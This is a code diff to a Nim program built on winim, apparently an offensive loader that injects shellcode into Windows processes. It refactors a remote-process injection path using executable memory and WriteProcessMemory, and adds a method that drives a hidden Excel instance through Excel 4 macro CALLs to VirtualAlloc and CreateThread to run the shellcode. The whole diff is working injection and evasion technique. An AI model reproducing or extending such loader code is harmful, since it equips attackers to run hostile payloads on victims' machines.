@@ -1,4 +1,5 @@
 import winim
+include writeProcessMemory
 
 # when not defined(USE_CRT) and not defined(USE_FIBRES) and not:
 #     proc inject*[I, T](shellcode: array[I, T]): void =
@@ -28,12 +29,10 @@ when defined(USE_CRT):
             PAGE_EXECUTE_READ_WRITE
         )
         var bytesWritten: SIZE_T
-        let wSuccess = WriteProcessMemory(
+        let wSuccess = writeMemory(
             pHandle, 
             rPtr,
-            unsafeAddr shellcode,
-            cast[SIZE_T](shellcode.len),
-            addr bytesWritten
+            shellcode
         )
         echo "[CRT] WriteProcessMemory: ", bool(wSuccess)
 
@@ -190,3 +189,16 @@ when defined(USE_VBSCRIPT):
         """
 
         obj.eval(vbs)
+
+when defined(USE_COMSCRIPT):
+    import winim/com
+
+
+    proc inject*[I, T](shellcode: array[I, T]): void {.inline.} =
+        comScript:
+            var objExcel = CreateObject("Excel.Application")
+            objExcel.Visible = false
+
+            var memaddr = objExcel.ExecuteExcel4Macro(&"CALL(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",0,{shellcode.len},4096,64)")
+
+            objExcel.ExecuteExcel4Macro(&"CALL(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",0, 0, {memaddr}, 0, 0, 0)")
